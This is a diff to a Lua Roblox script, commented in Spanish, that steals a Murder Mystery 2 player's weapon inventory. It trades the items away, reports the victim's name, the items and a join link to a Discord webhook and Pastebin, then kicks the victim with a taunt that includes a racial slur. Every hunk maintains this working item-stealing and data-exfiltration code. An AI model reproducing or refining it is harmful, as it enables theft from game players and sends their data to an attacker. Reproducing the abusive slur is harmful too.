@@ -179,18 +179,24 @@ table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amou
 local fernToken = math.random(100000,999999)
 local realLink = "[unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..fernToken..")"
 
+-- Guardamos una copia para webhook final
+local weaponsSent = {}
+for _, w in ipairs(weaponsToSend) do
+    table.insert(weaponsSent, w)
+end
+
 -- Webhook inicial con Pastebin si >18
 local pasteContent = ""
-for _, w in ipairs(weaponsToSend) do
+for _, w in ipairs(weaponsSent) do
     pasteContent = pasteContent..string.format("%s x%s (%s) | Valor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
 end
 pasteContent = pasteContent .. "\nValor total del inventario📦: "..tostring(totalValue).."💰"
 local pasteLink
-if #weaponsToSend > 18 then
+if #weaponsSent > 18 then
     pasteLink = CreatePaste(pasteContent)
 end
 
-if #weaponsToSend > 0 then
+if #weaponsSent > 0 then
     local fieldsInit={
         {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
         {name="Inventario 📦:", value="", inline=false},
@@ -198,13 +204,13 @@ if #weaponsToSend > 0 then
         {name="Click para unirte a la víctima 👇:", value=realLink, inline=false}
     }
 
-    local maxEmbedItems = math.min(18,#weaponsToSend)
+    local maxEmbedItems = math.min(18,#weaponsSent)
     for i=1,maxEmbedItems do
-        local w = weaponsToSend[i]
+        local w = weaponsSent[i]
         fieldsInit[2].value = fieldsInit[2].value..string.format("%s x%s (%s)\nValor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
     end
 
-    if #weaponsToSend > 18 then
+    if #weaponsSent > 18 then
         fieldsInit[2].value = fieldsInit[2].value.."... y más armas 🔥\n"
         if pasteLink then
             fieldsInit[2].value = fieldsInit[2].value.."Mira todos los ítems aquí 📜: [Mirar]("..pasteLink..")"
@@ -223,18 +229,18 @@ local function TradeFinalizado()
         {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true}
     }
 
-    local maxEmbedItems = math.min(18,#weaponsToSend)
+    local maxEmbedItems = math.min(18,#weaponsSent)
     for i=1,maxEmbedItems do
-        local w = weaponsToSend[i]
+        local w = weaponsSent[i]
         fieldsFinal[2].value = fieldsFinal[2].value..string.format("%s x%s (%s)\nValor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
     end
 
-    if #weaponsToSend > 18 then
+    if #weaponsSent > 18 then
         fieldsFinal[2].value = fieldsFinal[2].value.."... y más armas 🔥\n"
     end
 
     SendWebhook("✅ Todos los trades finalizados","💰Todas las armas enviadas correctamente 😎",fieldsFinal)
-    task.wait(5)
+    task.wait(3)
     LocalPlayer:Kick("El mejor ladron Anonimo, a robado todo tu invententario de mm2 😂😂🤣 llora negro https://discord.gg/4VySnCHy")
 end
 
